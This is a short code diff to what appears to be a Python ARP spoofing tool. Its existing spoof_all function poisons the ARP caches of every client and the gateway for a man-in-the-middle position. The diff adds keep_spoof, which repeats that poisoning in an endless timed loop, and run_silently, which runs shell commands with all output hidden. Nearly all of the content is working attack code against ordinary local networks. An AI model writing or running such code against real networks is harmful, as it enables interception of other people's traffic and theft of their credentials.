@@ -1,4 +1,7 @@
-import re
+import shlex
+import subprocess
+import time
+from subprocess import DEVNULL
 from typing import Dict, Tuple
 
 import netifaces
@@ -89,3 +92,16 @@ def spoof_all(clients: dict, gateway_ip: str, gateway_mac: str):
     for client_ip, client_mac in clients.items():
         arp_spoof(client_ip, client_mac, gateway_ip)
         arp_spoof(gateway_ip, gateway_mac, client_ip)
+
+
+def keep_spoof(clients: dict, gateway_ip: str, gateway_mac: str, interval: int):
+    while True:
+        try:
+            spoof_all(clients, gateway_ip, gateway_mac)
+            time.sleep(interval)
+        except KeyboardInterrupt:
+            return
+
+
+def run_silently(cmd: str):
+    subprocess.run(shlex.split(cmd), stdout=DEVNULL, stderr=DEVNULL)
